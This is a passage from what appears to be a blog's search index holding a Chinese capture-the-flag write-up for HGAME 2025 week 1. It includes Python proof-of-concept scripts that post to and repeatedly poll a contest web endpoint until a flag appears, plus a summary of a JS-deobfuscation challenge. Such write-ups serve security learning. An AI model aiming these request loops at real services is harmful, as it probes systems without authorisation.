Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"}]